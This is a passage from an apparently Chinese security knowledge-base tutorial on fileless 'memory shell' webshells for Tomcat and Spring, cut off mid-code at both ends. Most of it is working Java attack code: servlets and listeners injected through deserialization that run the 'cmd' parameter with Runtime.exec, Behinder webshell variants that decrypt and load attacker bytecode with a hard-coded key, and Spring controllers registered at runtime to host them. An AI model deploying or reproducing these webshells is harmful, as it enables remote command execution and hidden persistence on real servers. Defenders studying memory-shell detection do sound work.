TomcatInjectServlet(); org.apache.catalina.Wrapper demoWrapper = standardContext.createWrapper(); //设置Servlet名等 demoWrapper.setName(servletName); demoWrapper.setLoadOnStartup(1); demoWrapper.setServlet(demo); demoWrapper.setServletClass(demo.getClass().getName()); standardContext.addChild(demoWrapper); //设置ServletMap standardContext.addServletMapping(servletUrlPattern, servletName); } } catch (Exception e) { e.printStackTrace(); } } private static ServletContext getServletContext() throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException { ServletRequest servletRequest = null; /*shell注入，前提需要能拿到request、response等*/ Class c = Class.forName(\"org.apache.catalina.core.ApplicationFilterChain\"); java.lang.reflect.Field f = c.getDeclaredField(\"lastServicedRequest\"); f.setAccessible(true); ThreadLocal threadLocal = (ThreadLocal) f.get(null); //不为空则意味着第一次反序列化的准备工作已成功 if (threadLocal != null && threadLocal.get() != null) { servletRequest = (ServletRequest) threadLocal.get(); } //如果不能去到request，则换一种方式尝试获取 //spring获取法1 if (servletRequest == null) { try { c = Class.forName(\"org.springframework.web.context.request.RequestContextHolder\"); Method m = c.getMethod(\"getRequestAttributes\"); Object o = m.invoke(null); c = Class.forName(\"org.springframework.web.context.request.ServletRequestAttributes\"); m = c.getMethod(\"getRequest\"); servletRequest = (ServletRequest) m.invoke(o); } catch (Throwable t) { } } if (servletRequest != null) return servletRequest.getServletContext(); //spring获取法2 try { c = Class.forName(\"org.springframework.web.context.ContextLoader\"); Method m = c.getMethod(\"getCurrentWebApplicationContext\"); Object o = m.invoke(null); c = Class.forName(\"org.springframework.web.context.WebApplicationContext\"); m = c.getMethod(\"getServletContext\"); ServletContext servletContext = (ServletContext) m.invoke(o); return servletContext; } catch (Throwable t) { } return null; } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } @Override public void init(ServletConfig servletConfig) throws ServletException { } @Override public ServletConfig getServletConfig() { return null; } @Override public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException { String cmd = servletRequest.getParameter(\"cmd\"); if (cmd != null) { System.out.println(\"do Service\"); Process process = Runtime.getRuntime().exec(cmd); java.io.BufferedReader bufferedReader = new java.io.BufferedReader( new java.io.InputStreamReader(process.getInputStream())); StringBuilder stringBuilder = new StringBuilder(); String line; while ((line = bufferedReader.readLine()) != null) { stringBuilder.append(line + '\\n'); } servletResponse.getOutputStream().write(stringBuilder.toString().getBytes()); servletResponse.getOutputStream().flush(); servletResponse.getOutputStream().close(); return; } } @Override public String getServletInfo() { return null; } @Override public void destroy() { } } 编译生成对应的TomcatEcho.class,TomcatInjectServlet.class，然后通过序列化生成对应的TomcatEcho.ser,TomcatInjectServlet.ser,最后通过反序列化漏洞直接在目标web系统中反序列化最后成功注入 注入冰蝎马 在这里使用/xyz用于区别Filter的冰蝎马，实现原理同Filter，只是实现Servlet接口中的service()方法 @Override public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException { try { System.out.println(\"do service\"); // 获取request和response对象 HttpServletRequest request = (HttpServletRequest) servletRequest; HttpServletResponse response = (HttpServletResponse) servletResponse; HttpSession session = request.getSession(); //create pageContext HashMap pageContext = new HashMap(); pageContext.put(\"request\", request); pageContext.put(\"response\", response); pageContext.put(\"session\", session); if (request.getMethod().equals(\"POST\")) { String k = \"e45e329feb5d925b\";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/ session.putValue(\"u\", k); Cipher c = Cipher.getInstance(\"AES\"); c.init(2, new SecretKeySpec(k.getBytes(), \"AES\")); //revision BehinderFilter Method method = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class); method.setAccessible(true); byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine())); Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte,0, evilclass_byte.length); evilclass.newInstance().equals(pageContext); return; } } catch (Exception e) { e.printStackTrace(); } } 反序列化注入Listener 在Tomcat基础内存马入门中，Tomcat注入内存马中除了注入Filter，Servlet，还有Listener，但是在该篇中对request理解并不深，未深入研究是否可以回显，在此处发现可以通过request获取response @Override public void requestInitialized(ServletRequestEvent servletRequestEvent) { try{ HttpServletRequest req = (HttpServletRequest) servletRequestEvent.getServletRequest(); Field requestF = req.getClass().getDeclaredField(\"request\"); requestF.setAccessible(true); Request request = (Request)requestF.get(req); HttpServletResponse response = request.getResponse(); // 执行命令部分... }catch (Exception e){ e.printStackTrace(); } } 注入普通马 对应的TomcatInjectListener package com.fastjson.test; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import org.apache.catalina.connector.Request; import org.apache.catalina.core.ApplicationContext; import org.apache.catalina.core.StandardContext; import javax.servlet.ServletContext; import javax.servlet.ServletRequest; import javax.servlet.ServletRequestEvent; import javax.servlet.ServletRequestListener; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.lang.reflect.Field; import java.lang.reflect.Method; public class TomcatInjectListener extends AbstractTranslet implements ServletRequestListener { private final static String servletUrlPattern = \"/\"; private final static String servletName = \"test\"; static { try { ServletContext servletContext = getServletContext(); if (servletContext != null) { Field appctx = servletContext.getClass().getDeclaredField(\"context\"); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); ServletRequestListener listener = new TomcatInjectListener(); standardContext.addApplicationEventListener(listener); } }catch (Exception e){ e.printStackTrace(); } } private static ServletContext getServletContext() throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException { ServletRequest servletRequest = null; /*shell注入，前提需要能拿到request、response等*/ Class c = Class.forName(\"org.apache.catalina.core.ApplicationFilterChain\"); java.lang.reflect.Field f = c.getDeclaredField(\"lastServicedRequest\"); f.setAccessible(true); ThreadLocal threadLocal = (ThreadLocal) f.get(null); //不为空则意味着第一次反序列化的准备工作已成功 if (threadLocal != null && threadLocal.get() != null) { servletRequest = (ServletRequest) threadLocal.get(); } //如果不能去到request，则换一种方式尝试获取 //spring获取法1 if (servletRequest == null) { try { c = Class.forName(\"org.springframework.web.context.request.RequestContextHolder\"); Method m = c.getMethod(\"getRequestAttributes\"); Object o = m.invoke(null); c = Class.forName(\"org.springframework.web.context.request.ServletRequestAttributes\"); m = c.getMethod(\"getRequest\"); servletRequest = (ServletRequest) m.invoke(o); } catch (Throwable t) { } } if (servletRequest != null) return servletRequest.getServletContext(); //spring获取法2 try { c = Class.forName(\"org.springframework.web.context.ContextLoader\"); Method m = c.getMethod(\"getCurrentWebApplicationContext\"); Object o = m.invoke(null); c = Class.forName(\"org.springframework.web.context.WebApplicationContext\"); m = c.getMethod(\"getServletContext\"); ServletContext servletContext = (ServletContext) m.invoke(o); return servletContext; } catch (Throwable t) { } return null; } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } @Override public void requestDestroyed(ServletRequestEvent servletRequestEvent) { } @Override public void requestInitialized(ServletRequestEvent servletRequestEvent) { try{ HttpServletRequest req = (HttpServletRequest) servletRequestEvent.getServletRequest(); Field requestF = req.getClass().getDeclaredField(\"request\"); requestF.setAccessible(true); Request request = (Request)requestF.get(req); //通过resquest获取response HttpServletResponse response = request.getResponse(); String cmd = request.getParameter(\"cmd\"); if (cmd != null){ Process process = Runtime.getRuntime().exec(cmd); java.io.BufferedReader bufferedReader = new java.io.BufferedReader( new java.io.InputStreamReader(process.getInputStream())); StringBuilder stringBuilder = new StringBuilder(); String line; while ((line = bufferedReader.readLine()) != null) { stringBuilder.append(line + '\\n'); } response.getOutputStream().write(stringBuilder.toString().getBytes()); response.getOutputStream().flush(); response.getOutputStream().close(); return; } }catch (Exception e){ e.printStackTrace(); } } } 编译生成对应的TomcatEcho.class,TomcatInjectListener.class，然后通过序列化生成对应的TomcatEcho.ser,TomcatInjectListener.ser,最后通过反序列化漏洞直接在目标web系统中反序列化最后成功注入 注入冰蝎马 在这里只需要修改Listener的逻辑，为冰蝎马逻辑即可 @Override public void requestInitialized(ServletRequestEvent servletRequestEvent) { try{ System.out.println(\"do Linstener\"); HttpServletRequest req = (HttpServletRequest) servletRequestEvent.getServletRequest(); Field requestF = req.getClass().getDeclaredField(\"request\"); requestF.setAccessible(true); org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request)requestF.get(req); HttpServletResponse response = request.getResponse(); HttpSession session = request.getSession(); //create pageContext HashMap pageContext = new HashMap(); pageContext.put(\"request\", request); pageContext.put(\"response\", response); pageContext.put(\"session\", session); if (request.getMethod().equals(\"POST\")) { String k = \"e45e329feb5d925b\";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/ session.putValue(\"u\", k); Cipher c = Cipher.getInstance(\"AES\"); c.init(2, new SecretKeySpec(k.getBytes(), \"AES\")); //revision BehinderFilter Method method = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class); method.setAccessible(true); byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine())); Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte,0, evilclass_byte.length); evilclass.newInstance().equals(pageContext); return; } }catch (Exception e){ e.printStackTrace(); } } 参考链接 P1n93r-Tomcat 架构原理 threedr3am-基于tomcat的内存 Webshell 无文件攻击技术 天下大木头-Tomcat内存马学习（二） 洋洋-利用shiro反序列化注入冰蝎内存马 https://www.bbsmax.com/A/x9J2X9Dnd6/ Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 16:23:30 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/11.Tomcat内存马无文件攻击/ Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/12.Spring框架内存马入门/":{"url":"知识库/02.JAVA安全/12.Spring框架内存马入门/","title":"12.Spring框架内存马入门","keywords":"","body":" Spring Web 介绍 Bean ApplicationContext ContextLoaderListener 与 DispatcherServlet ContextLoaderListener DispatcherServlet 创建Spring MVC项目 Controller 手动注册Controller 获取当前代码运行的上下文环境（dispatcherServlet） RequestContextUtils getAttribute 阻止重复添加controller (非必须) 实例(添加Controller) 0x1 注入普通马 0x2 注入冰蝎马 基本逻辑 问题 拦截器 手工创建拦截器 分析拦截器的整个过程 动态注入 实例 0x1 注入普通马 0x2 注入冰蝎马 无文件落地注入 0x1 jndi 测试 0x2 jndi 注入冰蝎马 问题总结 参考链接 Spring Web 介绍 Bean bean 是Spring 框架的一个核心概念，它是构建程序的主干，并且是由Spring loC 容器负责实例化、配置、组装和管理的对象。 通俗来讲 bean 是对象 bean 被 loC容器管理 Spring 应用由一个个bean构成 ApplicationContext Spring 框架中，BeanFactory 接口是 Spring loC容器的实际代表者 从下面的接口继承关系图可以看出，ApplicationContext接口继承了BeanFactory接口，并通过继承其他接口进一步扩展了基本容器的功能 因此，org.springframework.context.ApplicationContext接口也代表了 IoC容器 ，它负责实例化、定位、配置应用程序中的对象(bean)及建立这些对象间(beans)的依赖 IoC容器通过读取配置元数据来获取对象的实例化、配置和组装的描述信息。配置的零元数据可以用xml、Java注解或Java代码来表示。 ContextLoaderListener 与 DispatcherServlet 下面是一个典型 Spring 应用的 web.xml 配置示例： HelloSpringMVC contextConfigLocation /WEB-INF/applicationContext.xml org.springframework.web.context.ContextLoaderListener dispatcherServlet org.springframework.web.servlet.DispatcherServlet contextConfigLocation /WEB-INF/dispatcherServlet-servlet.xml 1 dispatcherServlet / 在正式了解上面的配置前，先介绍下关于 Root Context 和 Child Context 的重要概念： Spring 应用中可以同时有多个 Context，其中只有一个 Root Context，剩下的全是 Child Context 所有Child Context都可以访问在 Root Context中定义的 bean，但是Root Context无法访问Child Context中定义的 bean 所有的Context在创建后，都会被作为一个属性添加到了 ServletContext中ContextLoaderListener ContextLoaderListener 主要被用来初始化全局唯一的Root Context，即 Root WebApplicationContext。 这个 Root WebApplicationContext 会和其他 Child Context 实例共享它的 IoC 容器，供其他 Child Context 获取并使用容器中的 bean。 回到 web.xml 中，其相关配置如下： ```xml contextConfigLocation /WEB-INF/applicationContext.xml org.springframework.web.context.ContextLoaderListener 依照规范，当没有显式配置 ContextLoaderListener 的 contextConfigLocation 时，程序会自动寻找 /WEB-INF/applicationContext.xml，作为配置文件，所以其实上面的 标签对其实完全可以去掉。 #### DispatcherServlet DispatcherServlet 的主要作用是处理传入的web请求，根据配置的 URL pattern，将请求分发给正确的 Controller 和 View。 DispatcherServlet 初始化完成后，会创建一个普通的 Child Context 实例。 剩下的servlet 标签中，配置项如下 ```xml dispatcherServlet org.springframework.web.servlet.DispatcherServlet contextConfigLocation /WEB-INF/dispatcherServlet-servlet.xml 1 上面给 org.springframework.web.servlet.DispatcherServlet 类设置了个别名 dispatcherServlet ，并配置了它的 contextConfigLocation 参数值为 /WEB-INF/dispatcherServlet-servlet.xml 依照规范，当没有显式配置 contextConfigLocation 时，程序会自动寻找 /WEB-INF/-servlet.xml，作为配置文件。因为上面的 是 dispatcherServlet，所以当没有显式配置时，程序依然会自动找到 /WEB-INF/dispatcherServlet-servlet.xml 配置文件 综上，可以了解到：每个具体的 DispatcherServlet 创建的是一个 Child Context，代表一个独立的 IoC 容器；而 ContextLoaderListener 所创建的是一个 Root Context，代表全局唯一的一个公共 IoC 容器 如果要访问和操作 bean ，一般要获得当前代码执行环境的IoC 容器 代表者 ApplicationContext 创建Spring MVC项目 这里使用maven创建spring mvc 项目，实现版本控制 这里选择maven-archetypes-webapp 这里记得选择本地配置好的源为aliyun的maven配置文件，这样会快一些 等待maven 下载好之后，就可以看到如下的目录结构 然后添加SpringMVC的相关包 4.0.0 org.example SpringMVC_Test 1.0-SNAPSHOT war SpringMVC_Test Maven Webapp http://www.example.com UTF-8 1.7 1.7 4.3.18.RELEASE junit junit 4.11 test org.springframework spring-core ${spring.version} org.springframework spring-web ${spring.version} org.springframework spring-oxm ${spring.version} org.springframework spring-tx ${spring.version} org.springframework spring-jdbc ${spring.version} org.springframework spring-webmvc ${spring.version} org.springframework spring-aop ${spring.version} org.springframework spring-context-support ${spring.version} org.springframework spring-test ${spring.version} SpringMVC_Test maven-clean-plugin 3.1.0 maven-resources-plugin 3.0.2 maven-compiler-plugin 3.8.0 maven-surefire-plugin 2.22.1 maven-war-plugin 3.2.2 maven-install-plugin 2.5.2 maven-deploy-plugin 2.8.2 然后添加SpringMVC框架，右键项目，点击Add Framework Support 如果在Add framework support中找不到Spring，那是因为项目中可能已经存在Spring相关文件，但不一定是完善的。因此我们要将已经存在的Spring给删掉，重新添加，方法如下： 点击Project Structure，选择Facets，就会看到有一个Spring啦，右击它，点删除就行啦，然后再回到上面第3步重新Add framework support Spring框架添加完之后，会看到目录下多了两个xml文件 下面开始配置web.xml HelloSpringMVC contextConfigLocation /WEB-INF/applicationContext.xml org.springframework.web.context.ContextLoaderListener dispatcher org.springframework.web.servlet.DispatcherServlet contextConfigLocation /WEB-INF/dispatcher-servlet.xml 1 dispatcher / 配置dispatcher-servlet.xml，负责mvc的配置 然后注意，需要在main目录中添加java、resource文件夹，并且在java目录下，添加包名com.spring.Controller,因为我们在dispatcher-servlet.xml中添加了 这个意思就是扫描com.spring.Controller包下的Controller，这样才能访问到写的Controller 最后再配置一下本地Tomcat 出现了warning，此时点击fix即可，或者 Controller 手动注册Controller 首先查看dispatcher-servlet.xml 视图路径在/WEB-INF/jsp/目录下 在/WEB-INF/jsp/目录下创建hello.jsp，isELIgnored=\"false\"这里一定要添加，否则model传过来的值，在高版本的SpringMVC中不会解析EL表达式 Title hello world ,${name} 一个正常的 Controller 示例代码如下，当用浏览器访问 /hi/say路径时，会在定义好的 View 中输出 hello world,aaron 字样 @Controller @RequestMapping(\"/hi\") public class HelloController { @RequestMapping(\"say\") public String say(Model model){ model.addAttribute(\"name\",\"aaron\"); return \"hello\"; } } 获取当前代码运行的上下文环境（dispatcherServlet） 在这里我通过使用LandGrey@观星实验室的方法获取到Root WebApplicationContext，注入也能成功，但是会报错，提示没有dispatcherServlet，也就是不能分发给对应的Controller，由于Root WebApplicationContext是无法访问到Child WebApplicationContext 定义的bean，applicationContext.xml全局配置也没有搞定，希望有大佬可以给我applicationContext.xml的相关配置，以及如何成功利用 这里使用LandGrey@观星实验室大佬的后两种获取Child Context的方法 RequestContextUtils WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()); 这里使用RequestContextUtils中的WebApplicationContext getWebApplicationContext(ServletRequest request)方法，通过 ServletRequest类的实例来获取WebApplicationContext 当拿到了这个WebApplicationContext之后，就需要在当前的context里注册Controller，然后给这个Controller绑定对应可解析的url，以及方法 public class InjectController { public InjectController() { // 从context中获得 RequestMappingHandlerMapping 的实例 RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class); // 通过反射获得自定义 controller 中的 Method 对象 Method method = Class.forName(\"com.spring.Controller.InjectController\").getMethod(\"test\"); // 定义访问 controller 的 URL 地址 PatternsRequestCondition url = new PatternsRequestCondition(\"/ccc\"); // 定义允许访问 controller 的 HTTP 方法（GET/POST） RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition(); // 在内存中动态注册 controller RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null); com.spring.Controller.InjectController injectToController = new com.spring.Controller.InjectController(); requestMappingHandlerMapping.registerMapping(info, injectToController, method); } public void test(){ xxx } } 在test方法中，需要实现我们的webshell的逻辑，首先需要完善webshell java.lang.Runtime.getRuntime().exec(\"command\"); 然后在将command变成我们可控制的，也就是传入可控参数，这时就需要获取当前的request和response，command 为request.getParamer(\"cmd\")就为可控参数了，所以就是获取request，response的问题了，这里我们使用spring提供获取request，response的方法，这里使用如下方法 HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest(); HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse(); test方法可以使用如下表示 public void test() throws IOException { // 获取request和response对象 HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest(); HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse(); // 获取cmd参数并执行命令 java.lang.Runtime.getRuntime().exec(request.getParameter(\"cmd\")); } getAttribute WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0); 同上，因为获取的都是Child WebApplicationContext 阻止重复添加controller (非必须) 这里使用bitterz大佬的代码 上面获取的requestMappingHandlerMapping中有一个mappingRegistry成员对象，而该对象下的urlLookup属性保存了已经注册的所有url路径，对mappingHandlerMapping进一步后发现，以上对象和属性都是私有的，且mappingRegistry并非mappingHandlerMapping中创建的，而是来自于基类AbstractHandlerMethodMapping。 AbstractHandlerMethodMapping基类的getMappingRegistry方法可以获取mappingRegistry，而urlLookup是其内部类MappingRegistry的私有属性，可以通过反射获取，反射获取urlLookup和判断我们给定的url是否被注册的代码块如下 // 获取abstractHandlerMethodMapping对象，以便反射调用其getMappingRegistry方法 AbstractHandlerMethodMapping abstractHandlerMethodMapping = context.getBean(AbstractHandlerMethodMapping.class); // 反射调用getMappingRegistry方法 Method method = Class.forName(\"org.springframework.web.servlet.handler.AbstractHandlerMethodMapping\").getDeclaredMethod(\"getMappingRegistry\"); method.setAccessible(true); Object mappingRegistry = (Object) method.invoke(abstractHandlerMethodMapping); // 反射获取urlLookup属性 Field field = Class.forName(\"org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry\").getDeclaredField(\"urlLookup\"); field.setAccessible(true); Map urlLookup = (Map) field.get(mappingRegistry); // 判断我们想要注入的路径是否被已经存在 Iterator urlIterator = urlLookup.keySet().iterator(); List urls = new ArrayList(); while (urlIterator.hasNext()){ String urlPath = (String) urlIterator.next(); if (\"/malicious\".equals(urlPath)){ System.out.println(\"url已存在\"); return; } } 实例(添加Controller) 0x1 注入普通马 在上述知道了具体的操作方法，我在这里使用一个手动注册的Controller，里面包含恶意代码，这样来模拟一下无文件内存马 package com.spring.Controller; import org.springframework.beans.factory.NoSuchBeanDefinitionException; import org.springframework.stereotype.Controller; import org.springframework.ui.Model; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.context.WebApplicationContext; import org.springframework.web.context.request.RequestContextHolder; import org.springframework.web.context.request.ServletRequestAttributes; import org.springframework.web.servlet.handler.AbstractHandlerMethodMapping; import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition; import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition; import org.springframework.web.servlet.mvc.method.RequestMappingInfo; import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import java.util.ArrayList; import java.util.Iterator; import java.util.List; import java.util.Map; @Controller public class HelloWorldController { public HelloWorldController() {} public void test() throws IOException { // 获取request和response对象 HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest(); HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse(); // 获取cmd参数并执行命令 java.lang.Runtime.getRuntime().exec(request.getParameter(\"cmd\")); } @RequestMapping(value = \"/hello\") public String hello(Model model) throws NoSuchBeanDefinitionException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, NoSuchFieldException { WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0); // 2. 从context中获得 RequestMappingHandlerMapping 的实例 RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class); // 判断url是否存在 AbstractHandlerMethodMapping abstractHandlerMethodMapping = context.getBean(AbstractHandlerMethodMapping.class); Method method = Class.forName(\"org.springframework.web.servlet.handler.AbstractHandlerMethodMapping\").getDeclaredMethod(\"getMappingRegistry\"); method.setAccessible(true); Object mappingRegistry = (Object) method.invoke(abstractHandlerMethodMapping); Field field = Class.forName(\"org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry\").getDeclaredField(\"urlLookup\"); field.setAccessible(true); Map urlLookup = (Map) field.get(mappingRegistry); Iterator urlIterator = urlLookup.keySet().iterator(); List urls = new ArrayList(); while (urlIterator.hasNext()){ String urlPath = (String) urlIterator.next(); if (\"/test\".equals(urlPath)){ System.out.println(\"url已存在\"); return \"hello\"; } } // 可选步骤，判断url是否存在 // 2. 通过反射获得自定义 controller 中test的 Method 对象 Method method2 = HelloWorldController.class.getMethod(\"test\"); // 3. 定义访问 controller 的 URL 地址 PatternsRequestCondition url = new PatternsRequestCondition(\"/test\"); // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST） RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition(); // 5. 在内存中动态注册 controller RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null); // 创建用于处理请求的对象 HelloWorldController injectToController = new HelloWorldController(); mappingHandlerMapping.registerMapping(info, injectToController, method2); model.addAttribute(\"name\",\"aaron\"); return \"hello\"; } } 目录结构如下，其中com.spring.Controller包的俩controller分别是两种获取Child WebApplicationContext的方法实现 在代码中可以看到，访问/hello，就会执行hello方法，然后就会动态注入url=>/test，以及controller(test方法) 0x2 注入冰蝎马 冰蝎马如下 可以看出，该jsp的核心功能有三点 为了方便地使用defineClass，创建了U这个类继承ClassLoader； 使用java自带的包，解密AES加密数据 使用defineClass加载AES解密后字节码，获得一个恶意类，利用newInstance创建这个类的实例，并调用equals方法 要特别注意pageContext这个对象，它是jsp文件运行过程中自带的对象，可以获取request/response/session这三个包含页面信息的重要对象，对应pageContext有getRequest/getResponse/getSession方法，所以注入的controller代码中，可以将pageContext换成一个Map，手动添加key和value即可。 冰蝎马需要继承ClassLoader后调用父类的defineClass，当然也可以用反射，但是这样更方便而已。对恶意类稍加改造，继承ClassLoader、定义新的构造函数、增加g函数、添加冰蝎的服务端代码 基本逻辑 public HttpServletResponse test() throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, IOException, BadPaddingException, IllegalBlockSizeException, IllegalAccessException, InstantiationException { HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest(); HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse(); HttpSession session = request.getSession(); if (request.getMethod().equals(\"POST\")) { session.setAttribute(\"u\", this.k); Cipher c = Cipher.getInstance(\"AES\"); c.init(2, new SecretKeySpec(this.k.getBytes(), \"AES\")); HelloWorldController helloWorldController = new HelloWorldController(ClassLoader.getSystemClassLoader()); String base64String = request.getReader().readLine(); byte[] bytesEncrypted = new sun.misc.BASE64Decoder().decodeBuffer(base64String); byte[] bytesDecrypted = c.doFinal(bytesEncrypted); Class newClass = helloWorldController.g(bytesDecrypted); Map pageContext = new HashMap(); pageContext.put(\"session\", session); pageContext.put(\"request\", request); pageContext.put(\"response\", response); newClass.newInstance().equals(pageContext); } return response; } 完整代码如下： package com.spring.Controller; import org.springframework.stereotype.Controller; import org.springframework.ui.Model; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.context.WebApplicationContext; import org.springframework.web.context.request.RequestContextHolder; import org.springframework.web.context.request.ServletRequestAttributes; import org.springframework.web.servlet.handler.AbstractHandlerMethodMapping; import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition; import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition; import org.springframework.web.servlet.mvc.method.RequestMappingInfo; import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping; import javax.crypto.BadPaddingException; import javax.crypto.Cipher; import javax.crypto.IllegalBlockSizeException; import javax.crypto.NoSuchPaddingException; import javax.crypto.spec.SecretKeySpec; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.HttpSession; import java.io.IOException; import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import java.security.InvalidKeyException; import java.security.NoSuchAlgorithmException; import java.util.*; @Controller public class HelloWorldController extends ClassLoader { private final String uri = \"/test\"; private final String k = \"e45e329feb5d925b\"; public HelloWorldController(ClassLoader c) { super(c); } public Class g(byte[] b) { return super.defineClass(b, 0, b.length); // 调用父类的defineClass函数 } public HelloWorldController() { } public HttpServletResponse test() throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, IOException, BadPaddingException, IllegalBlockSizeException, IllegalAccessException, InstantiationException { HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest(); HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse(); HttpSession session = request.getSession(); if (request.getMethod().equals(\"POST\")) { session.setAttribute(\"u\", this.k); Cipher c = Cipher.getInstance(\"AES\"); c.init(2, new SecretKeySpec(this.k.getBytes(), \"AES\")); HelloWorldController helloWorldController = new HelloWorldController(ClassLoader.getSystemClassLoader()); String base64String = request.getReader().readLine(); byte[] bytesEncrypted = new sun.misc.BASE64Decoder().decodeBuffer(base64String); byte[] bytesDecrypted = c.doFinal(bytesEncrypted); Class newClass = helloWorldController.g(bytesDecrypted); Map pageContext = new HashMap(); pageContext.put(\"session\", session); pageContext.put(\"request\", request); pageContext.put(\"response\", response); newClass.newInstance().equals(pageContext); } return response; } @RequestMapping(value = \"/hello\") public String hello(Model model) throws ClassNotFoundException, InvocationTargetException, IllegalAccessException, NoSuchMethodException, NoSuchFieldException { WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0); // 2. 从context中获得 RequestMappingHandlerMapping 的实例 RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class); // 判断url是否存在 AbstractHandlerMethodMapping abstractHandlerMethodMapping = context.getBean(AbstractHandlerMethodMapping.class); Method method = Class.forName(\"org.springframework.web.servlet.handler.AbstractHandlerMethodMapping\").getDeclaredMethod(\"getMappingRegistry\"); method.setAccessible(true); Object mappingRegistry = (Object) method.invoke(abstractHandlerMethodMapping); Field field = Class.forName(\"org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry\").getDeclaredField(\"urlLookup\"); field.setAccessible(true); Map urlLookup = (Map) field.get(mappingRegistry); Iterator urlIterator = urlLookup.keySet().iterator(); List urls = new ArrayList(); while (urlIterator.hasNext()) { String urlPath = (String) urlIterator.next(); if (\"/test\".equals(urlPath)) { System.out.println(\"url已存在\"); return \"hello\"; } } // 可选步骤，判断url是否存在 // 2. 通过反射获得自定义 controller 中test的 Method 对象 Method method2 = HelloWorldController.class.getMethod(\"test\"); // 3. 定义访问 controller 的 URL 地址 PatternsRequestCondition url = new PatternsRequestCondition(\"/test\"); // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST） 